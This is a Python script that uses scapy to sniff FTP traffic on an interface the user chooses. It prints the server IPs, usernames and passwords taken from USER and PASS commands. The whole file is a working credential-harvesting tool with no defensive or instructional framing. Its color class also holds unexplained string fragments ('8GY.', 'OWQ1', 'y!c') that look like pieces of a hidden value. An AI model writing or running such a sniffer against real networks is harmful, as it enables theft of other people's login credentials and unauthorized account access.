from typing import Protocol
import sys
from scapy.layers import inet
from scapy.all import *
from scapy.layers import *
import psutil
import scapy.all as scapy
from scapy.layers import http
linea = '--------------------------------------------------'

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR

def ftp_creds(p_ftp):
    if p_ftp[TCP].dport == 21:
        data =  p_ftp.sprintf("%Raw.load%")
        if "USER" in data:
            global ip_ftp
            global ip_ftp2
            ip_ftp = "'FTP IP: ", p_ftp[IP].dst, "'"
            print(ip_ftp)
            global user_ftp
            data = data.split(" ")
            data = data[1]
            global user_ftp2
            user_ftp = "'User: ", data, "'"
            print(user_ftp)
        elif "PASS" in data:
            data = data.split(" ")
            data = data[1]
            global passwd_ftp
            global passwd_ftp2
            passwd_ftp = "'PASSWORD: ", data,"'"
            print(passwd_ftp)
            print(linea)
            global ftp_ip_final
            global user_ftp_final


def ftp():
    print(linea)
    print(f"{bcolors.WARNING}Your Network Interfaces{bcolors.RESET}")
    addrs = psutil.net_if_addrs()
    cc = str(addrs.keys())
    interfaces = print(cc[9:])
    bb = input("Choose Interface to use: ")
    xs = 0
    if bb in cc:
        try:
            while xs>=0:
                print(linea)
                print(f"{bcolors.WARNING}Searching...{bcolors.RESET}")
                ftp_pkt = sniff(filter='tcp and port 21',iface=bb,prn=ftp_creds)


        except KeyboardInterrupt:
            print(f"{bcolors.FAIL}You cancelled with Ctrl+C{bcolors.RESET}")
            print(linea)
            global ftphost
            global ftpuser
            global ftpass

ftp()